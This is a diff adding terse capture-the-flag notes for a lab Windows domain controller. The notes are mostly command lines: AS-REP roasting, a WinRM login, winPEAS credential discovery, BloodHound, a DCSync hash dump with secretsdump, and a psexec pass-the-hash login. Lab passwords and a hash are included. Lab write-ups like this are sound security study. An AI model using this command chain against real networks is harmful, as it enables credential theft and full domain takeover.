@@ -1,0 +1,31 @@
+//based on egotisticalSW
+Domain: EGOTISTICAL-BANK.LOCAL0.
+
+//not useful for now, but must be tested
+python windapsearch.py -d EGOTISTICAL-BANK.LOCAL --dc-ip 10.10.10.175 -U
+GetADUsers.py EGOTISTICAL-BANK.LOCAL/ -dc-ip 10.10.10.175 -debug
+smbclient -N -L \\\10.10.10.175
+
+https://github.com/urbanadventurer/username-anarchy
+/opt/username-anarchy/username-anarchy --input-file usernames.txt --select-format first,flast,first.last,first1 > users.txt
+while read p; do GetNPUsers.py EGOTISTICAL-BANK.LOCAL/"$p" -request -no-pass -dc-ip 10.10.10.175 >> hash.txt; done < users.txt
+evil-winrm -i 10.10.10.175 -u Fsmith -p Thestrokes23
+upload winPEAS.exe
+.\winPEAS.exe
+ Some AutoLogon credentials were found!!                                                                       
+    DefaultDomainName             :  EGOTISTICALBANK                                                              
+    DefaultUserName               :  EGOTISTICALBANK\svc_loanmanager                                              
+    DefaultPassword               :  Moneymakestheworldgoround!
+dir c:\Users	//svc_loanmgr logged locally
+net user svc_loanmgr	//member of Remote Management Users
+
+bloodhound-python -u svc_loanmgr -p "Moneymakestheworldgoround!" -d EGOTISTICAL-BANK.LOCAL -ns 10.10.10.175 -c ALL
+neo4j console
+zip info.zip *.json
+bloodhound	//drag and drop zip
+//queries/Find Principals with DCSync Rights
+//svc_loanmgr can dump password hashes from the Domain Controller by using a DCSync attack
+
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff:::
+secretsdump.py EGOTISTICAL-BANK.LOCAL/svc_loanmgr@10.10.10.175 -just-dc-user Administrator
+psexec.py EGOTISTICAL-BANK.LOCAL/administrator@10.10.10.175 -hashes aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff
